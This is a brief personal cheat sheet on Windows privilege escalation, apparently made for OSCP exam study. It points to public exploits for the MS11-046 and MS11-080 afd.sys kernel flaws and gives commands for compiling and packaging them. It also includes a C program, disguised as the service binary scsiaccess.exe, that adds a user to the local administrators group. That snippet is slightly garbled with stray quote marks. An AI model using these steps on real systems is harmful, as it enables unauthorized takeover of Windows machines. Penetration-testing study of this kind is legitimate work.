# Windows Privilage Escalation
------------------------------------

MS11-046 "afd.sys" 
---------------------------------------
Supported Versions: xp-win7

https://www.exploit-db.com/exploits/40564

Complie it using the following command:
------

i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 

--------------------------------------
MS11-080 "afd.sys"
---------------------------------------
Supported Versions: xp/2003

https://www.exploit-db.com/exploits/18176

Run it on the client machine.

python pyinstaller.py --onefile ms11-080.py (on windows!)

** I already compiled the exploit and uploaded it to my private repo on "https://www.github.com/NetanelShoshan/OSCP" 

--------------------------------------
Incorrect File and Service permissions:
---------------------------------------
useradd.c

"include <stdlib.h>
"/* system, NULL, EXIT_FAILURE */
"#int main ()
"{
"int i;
"i=system ("net localgroup administrators low /add");
"return 0;
"}
Compile the code above using the following command:
----
i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
--------------------------------------



